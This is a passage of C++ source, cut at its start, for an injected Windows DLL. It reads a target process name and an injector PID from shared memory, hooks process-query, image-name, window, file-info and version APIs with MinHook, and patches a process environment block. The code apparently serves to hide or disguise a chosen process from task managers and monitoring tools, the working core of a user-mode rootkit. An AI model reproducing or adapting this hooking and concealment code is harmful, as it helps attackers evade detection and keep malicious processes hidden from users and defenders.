    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
    HMODULE psapi = LoadLibraryA("psapi.dll");
    HMODULE shell32 = LoadLibraryA("shell32.dll");
    HMODULE user32 = LoadLibraryA("user32.dll");
    HMODULE version = LoadLibraryA("version.dll");

    if (!ntdll || !kernel32) return false;

    g_OrigNtQuerySystemInformation = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(ntdll, "NtQuerySystemInformation");
    g_OrigNtQueryInformationProcess = (PNT_QUERY_INFORMATION_PROCESS)GetProcAddress(ntdll, "NtQueryInformationProcess");
    g_OrigNtQueryVirtualMemory = (PNT_QUERY_VIRTUAL_MEMORY)GetProcAddress(ntdll, "NtQueryVirtualMemory");
    g_OrigQueryFullProcessImageNameW = (PQUERY_FULL_PROCESS_IMAGE_NAME_W)GetProcAddress(kernel32, "QueryFullProcessImageNameW");

    if (psapi) {
        g_OrigGetProcessImageFileNameW = (PGET_PROCESS_IMAGE_FILE_NAME_W)GetProcAddress(psapi, "GetProcessImageFileNameW");
        g_OrigGetModuleFileNameExW = (PGET_MODULE_FILE_NAME_EX_W)GetProcAddress(psapi, "GetModuleFileNameExW");
    }

    if (user32) {
        g_OrigGetWindowTextW = (PGET_WINDOW_TEXT_W)GetProcAddress(user32, "GetWindowTextW");
        g_OrigSetWindowTextW = (PSET_WINDOW_TEXT_W)GetProcAddress(user32, "SetWindowTextW");
        g_OrigGetClassNameW = (PGET_CLASS_NAME_W)GetProcAddress(user32, "GetClassNameW");
    }

    if (shell32) {
        g_OrigSHGetFileInfoW = (PSH_GET_FILE_INFO_W)GetProcAddress(shell32, "SHGetFileInfoW");
    }

    if (version) {
        g_OrigGetFileVersionInfoSizeW = (PGET_FILE_VERSION_INFO_SIZE_W)GetProcAddress(version, "GetFileVersionInfoSizeW");
        g_OrigGetFileVersionInfoW = (PGET_FILE_VERSION_INFO_W)GetProcAddress(version, "GetFileVersionInfoW");
        g_OrigVerQueryValueW = (PVER_QUERY_VALUE_W)GetProcAddress(version, "VerQueryValueW");
    }

    g_OrigExtractIconExW = (PEXTRACT_ICON_EX_W)GetProcAddress(shell32, "ExtractIconExW");

    if (MH_Initialize() != MH_OK) return false;

    auto create = [](LPVOID target, LPVOID detour, LPVOID* orig) -> bool {
        return MH_CreateHook(target, detour, orig) == MH_OK && MH_EnableHook(target) == MH_OK;
    };

    if (!create(g_OrigNtQuerySystemInformation, &Hooked_NtQuerySystemInformation, (LPVOID*)&g_TrampNtQuerySystemInformation)) return false;
    if (!create(g_OrigNtQueryInformationProcess, &Hooked_NtQueryInformationProcess, (LPVOID*)&g_OrigNtQueryInformationProcess)) return false;
    if (g_OrigNtQueryVirtualMemory) create(g_OrigNtQueryVirtualMemory, &Hooked_NtQueryVirtualMemory, (LPVOID*)&g_OrigNtQueryVirtualMemory);
    if (!create(g_OrigQueryFullProcessImageNameW, &Hooked_QueryFullProcessImageNameW, (LPVOID*)&g_OrigQueryFullProcessImageNameW)) return false;
    if (g_OrigGetProcessImageFileNameW) create(g_OrigGetProcessImageFileNameW, &Hooked_GetProcessImageFileNameW, (LPVOID*)&g_OrigGetProcessImageFileNameW);
    if (g_OrigGetModuleFileNameExW) create(g_OrigGetModuleFileNameExW, &Hooked_GetModuleFileNameExW, (LPVOID*)&g_OrigGetModuleFileNameExW);
    if (g_OrigGetWindowTextW) create(g_OrigGetWindowTextW, &Hooked_GetWindowTextW, (LPVOID*)&g_OrigGetWindowTextW);
    if (g_OrigGetClassNameW) create(g_OrigGetClassNameW, &Hooked_GetClassNameW, (LPVOID*)&g_OrigGetClassNameW);
    if (g_OrigSHGetFileInfoW) create(g_OrigSHGetFileInfoW, &Hooked_SHGetFileInfoW, (LPVOID*)&g_OrigSHGetFileInfoW);
    if (g_OrigGetFileVersionInfoSizeW) create(g_OrigGetFileVersionInfoSizeW, &Hooked_GetFileVersionInfoSizeW, (LPVOID*)&g_OrigGetFileVersionInfoSizeW);
    if (g_OrigGetFileVersionInfoW) create(g_OrigGetFileVersionInfoW, &Hooked_GetFileVersionInfoW, (LPVOID*)&g_OrigGetFileVersionInfoW);
    if (g_OrigExtractIconExW) create(g_OrigExtractIconExW, &Hooked_ExtractIconExW, (LPVOID*)&g_OrigExtractIconExW);

    DllLog("All hooks installed in PID:%lu", GetCurrentProcessId());
    return true;
}

// ============================================================================
// Shared memory
// ============================================================================
void ReadSharedMemory() {
    HANDLE hMap = OpenFileMappingA(FILE_MAP_ALL_ACCESS, FALSE, "GetProcessName");
    if (!hMap) {
        DllLog("OpenFileMappingA failed: %lu", GetLastError());
        return;
    }

    LPVOID buf = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 256);
    if (!buf) {
        CloseHandle(hMap);
        return;
    }

    char* data = (char*)buf;
    if (data[0] != '\0') {
        int wideLen = MultiByteToWideChar(CP_UTF8, 0, data, -1, nullptr, 0);
        if (wideLen > 0) {
            g_targetProcessName = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
            if (g_targetProcessName) {
                MultiByteToWideChar(CP_UTF8, 0, data, -1, g_targetProcessName, wideLen);
            }
        }
    }

    memcpy(&g_injectorPid, data + 128, sizeof(DWORD));

    DllLog("Config loaded: target=%ls injectorPID=%lu",
        g_targetProcessName ? g_targetProcessName : L"(none)", g_injectorPid);

    UnmapViewOfFile(buf);
    CloseHandle(hMap);
}

// ============================================================================
// PID resolver
// ============================================================================
DWORD WINAPI ResolveTargetPidThread(LPVOID) {
    if (!g_targetProcessName) return 0;

    while (true) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (snap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(snap, &pe)) {
                do {
                    if (_wcsicmp(pe.szExeFile, g_targetProcessName) == 0) {
                        if (g_targetPid != pe.th32ProcessID) {
                            g_targetPid = pe.th32ProcessID;
                            DllLog("Resolved target PID: %lu", g_targetPid);
                        }
                        break;
                    }
                } while (Process32NextW(snap, &pe));
            }
            CloseHandle(snap);
        }
        Sleep(2000);
    }
    return 0;
}

// ============================================================================
// DllMain
// ============================================================================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        DllLog("DLL attached to PID:%lu", GetCurrentProcessId());
        ReadSharedMemory();
        InstallHooks();
        PatchTargetPEB();
        CloseHandle(CreateThread(NULL, 0, ResolveTargetPidThread, NULL, 0, NULL));
        break;

    case DLL_PROCESS_DETACH:
        DllLog("DLL detached from PID:%lu", GetCurrentProcessId());
        MH_DisableHook(MH_ALL_HOOKS);
        MH_Uninitialize();
        if (g_targetProcessName) {
            free(g_targetProcessName);
            g_targetProcessName = nullptr;
        }
        break;
    }
    return TRUE;
}